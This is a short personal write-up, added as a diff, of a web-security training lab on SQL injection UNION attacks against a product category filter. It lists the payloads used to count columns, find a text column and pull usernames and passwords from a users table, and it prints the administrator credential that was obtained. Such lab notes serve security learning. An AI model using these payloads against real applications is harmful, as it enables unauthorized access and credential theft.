@@ -1,0 +1,25 @@
+Lab - SQL injection UNION attack, retrieving multiple values in a single column
+
+Vulnerable feature - Product category filter
+
+Goal - Retrieves all usernames and passwords, and use the information to log in as the administrator user
+
+Analysis:
+The results from te query are returned in the app's response -> can use UNION attack to retrieve
+data from other tables.
+
+1. Determine the No of columns returned by the query
+Corporate gifts'ORDER BY 3--
+-> There are 2 cols 
+
+2. Find the col that contain text
+Corporate gifts'UNION SELECT NULL, 'a'--
+--> only second column are of data type string
+
+3. Get the data
+Lifestyle'UNION SELECT NULL,username ||'~'||password FROM users--
+
+administrator~22hs9dciinbryp22gc3v
+
+SOLVED
+
